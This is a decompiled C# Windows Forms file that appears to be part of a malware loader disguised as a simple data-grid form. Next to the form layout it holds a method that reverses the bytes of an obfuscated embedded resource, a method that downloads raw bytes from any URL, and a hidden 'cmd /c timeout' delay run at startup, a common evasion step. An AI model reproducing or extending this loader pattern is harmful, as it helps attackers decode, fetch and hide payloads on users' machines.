using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Windows.Forms;
using Saslmg.Properties;

namespace Saslmg;

public class Form2 : Form
{
	private IContainer m_Visitor = null;

	private DataGridView _Setter;

	private DataGridViewTextBoxColumn _Customer;

	private DataGridViewTextBoxColumn m_Server;

	public Form2()
	{
		PushProperty();
		PatchProperty();
	}

	private byte[] SetProperty(string value)
	{
		return new WebClient().DownloadData(new Uri(value));
	}

	internal byte[] ViewProperty()
	{
		byte[] koahpsxuujlptp = Resources.Koahpsxuujlptp;
		List<byte> list = new List<byte>();
		int num = koahpsxuujlptp.Length;
		while (num-- > 0)
		{
			list.Add(koahpsxuujlptp[num]);
		}
		return list.ToArray();
	}

	private void PatchProperty()
	{
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/c timeout /t 10",
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		})!.WaitForExit();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && m_Visitor != null)
		{
			m_Visitor.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void PushProperty()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		_Setter = new DataGridView();
		_Customer = new DataGridViewTextBoxColumn();
		m_Server = new DataGridViewTextBoxColumn();
		((ISupportInitialize)_Setter).BeginInit();
		((Control)this).SuspendLayout();
		_Setter.set_ColumnHeadersHeightSizeMode((DataGridViewColumnHeadersHeightSizeMode)2);
		_Setter.get_Columns().AddRange((DataGridViewColumn[])(object)new DataGridViewColumn[2]
		{
			(DataGridViewColumn)_Customer,
			(DataGridViewColumn)m_Server
		});
		((Control)_Setter).set_Dock((DockStyle)5);
		((Control)_Setter).set_Location(new Point(0, 0));
		((Control)_Setter).set_Name("dataGridView1");
		_Setter.set_RowHeadersWidth(72);
		_Setter.get_RowTemplate().set_Height(31);
		((Control)_Setter).set_Size(new Size(653, 327));
		((Control)_Setter).set_TabIndex(1);
		((DataGridViewColumn)_Customer).set_HeaderText("Column1");
		((DataGridViewColumn)_Customer).set_MinimumWidth(9);
		((DataGridViewColumn)_Customer).set_Name("Column1");
		((DataGridViewBand)_Customer).set_ReadOnly(true);
		((DataGridViewColumn)_Customer).set_Width(175);
		((DataGridViewColumn)m_Server).set_HeaderText("Column2");
		((DataGridViewColumn)m_Server).set_MinimumWidth(9);
		((DataGridViewColumn)m_Server).set_Name("Column2");
		((DataGridViewBand)m_Server).set_ReadOnly(true);
		((DataGridViewColumn)m_Server).set_Width(175);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(11f, 24f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(653, 327));
		((Control)this).get_Controls().Add((Control)(object)_Setter);
		((Control)this).set_Name("Form2");
		((Control)this).set_Text("Form2");
		((ISupportInitialize)_Setter).EndInit();
		((Control)this).ResumeLayout(false);
	}
}
